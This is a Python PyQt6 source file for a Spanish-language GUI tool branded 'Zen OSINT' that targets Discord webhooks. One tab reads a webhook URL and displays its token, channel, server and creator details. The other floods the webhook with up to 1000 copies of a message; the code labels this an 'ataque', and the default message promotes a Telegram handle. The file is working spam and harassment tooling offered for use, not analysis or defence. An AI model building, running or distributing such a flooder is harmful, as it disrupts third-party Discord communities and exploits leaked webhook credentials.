import sys
import os
import requests
import threading
import time
from PyQt6.QtWidgets import (QApplication, QWidget, QVBoxLayout, QHBoxLayout, 
                             QLineEdit, QLabel, QPushButton, QTextEdit, QTabWidget, QSpinBox)
from PyQt6.QtGui import QIcon
from PyQt6.QtCore import Qt

os.environ["QT_LOGGING_RULES"] = "*=false"

class ZenWebhookTool(QWidget):
    def __init__(self):
        super().__init__()
        self.setFixedSize(900, 950)
        self.setWindowTitle("Zen OSINT - Webhook info + Webhook Spam")
        self.setStyleSheet("background-color: #050505; color: #e0e0e0; font-family: monospace;")
        self.init_ui()

    def init_ui(self):
        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(30, 30, 30, 30)


        header = QLabel("ZEN WEBHOOK MULTI-TOOL")
        header.setStyleSheet("color: #A020F0; font-size: 26px; font-weight: bold; margin-bottom: 20px;")
        main_layout.addWidget(header, alignment=Qt.AlignmentFlag.AlignCenter)


        main_layout.addWidget(QLabel("URL DEL WEBHOOK TARGET:"))
        self.webhook_input = QLineEdit()
        self.webhook_input.setPlaceholderText("https://discord.com/api/webhooks/...")
        self.webhook_input.setStyleSheet("background: #111; border: 1px solid #333; padding: 15px; color: #FFA07A; font-size: 13px;")
        main_layout.addWidget(self.webhook_input)


        self.tabs = QTabWidget()
        self.tabs.setStyleSheet("""
            QTabWidget::pane { border: 1px solid #A020F0; background: #050505; }
            QTabBar::tab { 
                background: #111; color: #888; padding: 12px; min-width: 150px; 
                border: 1px solid #222; border-bottom: none; 
            }
            QTabBar::tab:selected { background: #050505; color: #A020F0; font-weight: bold; }
        """)


        self.tab_info = QWidget()
        layout_i = QVBoxLayout(self.tab_info)
        self.btn_info = self.create_btn("Iconos/Cod.svg", "EXTRAER INFO WEBHOOK")
        self.btn_info.clicked.connect(self.run_info)
        layout_i.addWidget(self.btn_info)
        layout_i.addStretch()


        self.tab_spam = QWidget()
        layout_s = QVBoxLayout(self.tab_spam)
        
        layout_s.addWidget(QLabel("MENSAJE A SPAMEAR:"))
        self.spam_msg = QLineEdit("ZEN OSINT DOMINANDO, t.me/Valen_Qq.")
        self.spam_msg.setStyleSheet("background: #111; border: 1px solid #333; padding: 10px;")
        layout_s.addWidget(self.spam_msg)

        h_opts = QHBoxLayout()
        h_opts.addWidget(QLabel("CANTIDAD:"))
        self.spam_count = QSpinBox()
        self.spam_count.setRange(1, 1000)
        self.spam_count.setValue(10)
        self.spam_count.setStyleSheet("background: #111; color: #fff; padding: 5px;")
        h_opts.addWidget(self.spam_count)
        
        h_opts.addWidget(QLabel("DELAY (seg):"))
        self.spam_delay = QSpinBox()
        self.spam_delay.setRange(0, 10)
        self.spam_delay.setValue(1)
        self.spam_delay.setStyleSheet("background: #111; color: #fff; padding: 5px;")
        h_opts.addWidget(self.spam_delay)
        layout_s.addLayout(h_opts)

        self.btn_spam = self.create_btn("Iconos/Xor.svg", "INICIAR SPAM")
        self.btn_spam.clicked.connect(self.start_spam_thread)
        layout_s.addWidget(self.btn_spam)
        layout_s.addStretch()

        self.tabs.addTab(self.tab_info, "INFO")
        self.tabs.addTab(self.tab_spam, "SPAMMER")
        main_layout.addWidget(self.tabs)


        main_layout.addWidget(QLabel("Acciones : "))
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet("background: #000; border: 1px solid #222; color: #fff; padding: 10px;")
        main_layout.addWidget(self.log_output)

    def create_btn(self, icon, text):
        btn = QPushButton(f" {text}")
        if os.path.exists(icon): btn.setIcon(QIcon(icon))
        btn.setStyleSheet("""
            QPushButton { background: #111; border: 1px solid #A020F0; padding: 15px; font-weight: bold; }
            QPushButton:hover { background: #A020F0; color: white; }
        """)
        return btn

    def log(self, label, value):
        r, w = "#FF0000", "#FFFFFF"
        fmt = f"<span style='color:{w};'>[</span><span style='color:{r};'>+</span><span style='color:{w};'>]</span> <span style='color:{r};'>{label} :</span> <span style='color:{w};'>{value}</span>"
        self.log_output.append(fmt)

    def run_info(self):
        url = self.webhook_input.text().strip()
        if not url: return
        self.log_output.clear()
        try:
            res = requests.get(url)
            if res.status_code != 200:
                self.log("ERROR", "URL Invalida o Webhook eliminado")
                return
            data = res.json()
            self.log("ID Webhook", data.get('id'))
            self.log("Nombre", data.get('name'))
            self.log("Token", data.get('token'))
            self.log("Tipo", "Bot" if data.get('type')==1 else "Usuario")
            self.log("Canal ID", data.get('channel_id'))
            self.log("Servidor ID", data.get('guild_id'))
            
            if 'user' in data:
                u = data['user']
                self.log("Creador", f"{u['username']} ({u['id']})")
                self.log("Global Name", u.get('global_name', 'N/A'))
        except Exception as e:
            self.log("EXCEPTION", str(e))

    def start_spam_thread(self):
        threading.Thread(target=self.run_spammer, daemon=True).start()

    def run_spammer(self):
        url = self.webhook_input.text().strip()
        msg = self.spam_msg.text()
        count = self.spam_count.value()
        delay = self.spam_delay.value()
        
        if not url: return
        self.log("SISTEMA", f"Iniciando ataque de {count} mensajes...")
        
        for i in range(count):
            try:
                r = requests.post(url, json={"content": msg})
                if r.status_code in [200, 204]:
                    self.log(f"MSG {i+1}", "Enviado con exito")
                elif r.status_code == 429:
                    self.log("RATE LIMIT", "Esperando para reintentar...")
                    time.sleep(5)
                else:
                    self.log("ERROR", f"Status: {r.status_code}")
                time.sleep(delay)
            except:
                break
        self.log("SISTEMA", "Spam finalizado.")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    win = ZenWebhookTool()
    win.show()
    sys.exit(app.exec())
